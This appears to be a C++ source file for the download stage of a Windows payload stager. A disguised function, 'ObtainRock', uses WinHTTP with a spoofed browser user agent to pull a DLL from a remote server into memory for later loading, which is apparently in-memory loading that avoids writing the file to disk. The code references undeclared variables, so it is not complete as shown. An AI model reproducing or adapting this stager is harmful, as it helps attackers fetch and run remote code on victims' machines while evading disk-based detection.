#include <winhttpapi.h>

void ErrorCallback(const char* msg, DWORD status, const std::vector<HANDLE> openHandles){
    printf("%s - %s: %d\n", err, msg, status);
    for (auto handle : openHandles) {
        if (handle != NULL) {
            WinHttpCloseHandle(handle);
        }
    }

    exit(EXIT_FAILURE);
}

char* ObtainRock(LPCWSTR server, DWORD port, LPCWSTR dll){
    std::vector<unsigned char> buffer;
    std::vector<HANDLE> openHandles;

    LPSTR tmpBuffer; 

    DWORD bytesRead = 0;
    DWORD bytesWritten = 0;
    DWORD dSize = 0;

    SIZE_T bSize = 0; 
    
    HANDLE hFile = NULL; 

    HINTERNET hSession = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    
    printf("%s - Establishing the connection to the server\n", info);

    hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if(hSession == NULL){
        ErrorCallback("Error getting http session", GetLastError(), openHandles);
    }

    openHandles.push_back(hSession);

    hConnect = WinHttpConnect(hSession, server, port, 0);
    if (hConnect == NULL) {
        ErrorCallback("Error connecting to the server", GetLastError(), openHandles);
    }

    openHandles.push_back(hConnect);

    hRequest= WinHttpOpenRequest(hConnect, L"GET", dll, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (hRequest == NULL) {
        ErrorCallback("Error crafting the request", GetLastError(), openHandles);
    }

    openHandles.push_back(hRequest);

    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
        ErrorCallback("Error sending the request", GetLastError(), openHandles);
    }

    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        ErrorCallback("Error receiving the response", GetLastError(), openHandles);
    }

    do {
        DWORD statusCode = 0;
        DWORD statusCodeSize = sizeof(statusCode);

        dSize = 0;
        
        if (!WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, NULL, &statusCode, &statusCodeSize, NULL)) {
            ErrorCallback("Error in WinHttpQueryHeaders", GetLastError(), openHandles);
        }

        if (statusCode != 200) {
            ErrorCallback("DLL not found in the server", -1, openHandles);
        }

        if (!WinHttpQueryDataAvailable(hRequest, &dSize)){
            ErrorCallback("Error in WinHttpQueryDataAvailable", GetLastError(), openHandles);
        }
                
        
        tmpBuffer = new char[dSize + 1];

        if(!tmpBuffer){
            ErrorCallback("Error allocating memory for the tmpBuffer", -1, openHandles);
        }

        ZeroMemory(tmpBuffer, dSize + 1);

        if (!WinHttpReadData(hRequest, (LPVOID)tmpBuffer, dSize, &bytesRead)) {
            ErrorCallback("Error reading HTTP data", GetLastError(), openHandles);
        }

        buffer.insert(buffer.end(), tmpBuffer, tmpBuffer + bytesRead);

        delete[] tmpBuffer;
    }
    while(dSize > 0);

    if(buffer.empty() == TRUE){
        ErrorCallback("Error reading HTTP data, DLL readed is empty", -1, openHandles);
    }

    printf("%s - DLL obtained correctly\n", info);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    bSize = buffer.size();
    char* DLL = (char*)malloc(bSize);
    for (size_t i = 0; i < buffer.size(); i++) {
        DLL[i] = buffer[i];
    }

    return DLL;
}